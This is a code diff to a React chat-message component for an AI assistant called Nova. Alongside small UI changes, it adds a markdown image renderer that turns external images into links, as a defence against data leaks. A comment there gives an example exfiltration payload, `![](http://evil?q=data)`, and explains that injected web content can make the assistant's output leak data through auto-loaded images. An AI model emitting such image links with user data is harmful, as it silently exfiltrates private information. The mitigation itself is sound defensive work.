@@ -1,4 +1,5 @@
 import React, { useState, useCallback, useMemo } from "react";
+import { createPortal } from "react-dom";
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { Check, Copy, BookOpen, ChevronUp, ChevronDown, ExternalLink } from "lucide-react";
@@ -34,7 +35,7 @@ function CopyButton({ text, className }: { text: string; className?: string }) {
   );
 }
 
-const markdownComponents = {
+export const markdownComponents = {
   pre({ children, ...props }: React.ComponentPropsWithoutRef<"pre">) {
     const codeEl = (children as React.ReactElement[])?.[0];
     const codeText =
@@ -83,6 +84,29 @@ const markdownComponents = {
       </code>
     );
   },
+  img({ src, alt }: React.ComponentPropsWithoutRef<"img">) {
+    // Security (audit 2026-08-22): never auto-fetch an external image from
+    // assistant markdown. Nova's answers are text; a `![](http://evil?q=data)`
+    // only arrives from ingested/injected web content, and the browser loading
+    // it on render is a silent exfiltration/tracking vector. `data:` URIs carry
+    // no network fetch, so they render; everything else is defanged to a
+    // click-to-open link that the browser never fetches automatically.
+    const s = String(src || "");
+    const label = (alt && String(alt).trim()) || "image";
+    if (s.startsWith("data:")) {
+      return <img src={s} alt={label} className="max-h-64 rounded-lg border border-nova-border" />;
+    }
+    return (
+      <a
+        href={s || "#"}
+        target="_blank"
+        rel="noopener noreferrer nofollow"
+        className="text-nova-text-dim underline decoration-dotted"
+      >
+        [image: {label}]
+      </a>
+    );
+  },
 };
 
 export default React.memo(function ChatMessage({ message }: Props) {
@@ -114,7 +138,7 @@ export default React.memo(function ChatMessage({ message }: Props) {
               onClick={() => setImageExpanded(true)}
               className="mb-2.5 max-h-36 cursor-pointer rounded-lg border border-white/20 object-cover hover:opacity-80 transition-opacity shadow-[var(--shadow-nova-sm)]"
             />
-            {imageExpanded && (
+            {imageExpanded && createPortal(
               <div
                 className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fade-in"
                 role="dialog"
@@ -128,7 +152,8 @@ export default React.memo(function ChatMessage({ message }: Props) {
                   alt="Expanded"
                   className="max-h-[85vh] max-w-[85vw] rounded-lg shadow-[var(--shadow-nova-lg)]"
                 />
-              </div>
+              </div>,
+              document.body,
             )}
           </>
         )}
@@ -211,7 +236,7 @@ export default React.memo(function ChatMessage({ message }: Props) {
         {/* Timestamp */}
         {message.created_at && (
           <div
-            className="mt-1.5 text-[10px] text-nova-text-dim/40 tracking-wide"
+            className="mt-1.5 text-[10px] text-nova-text-dim/70 tracking-wide"
             title={message.created_at}
           >
             {formatDate(message.created_at)}
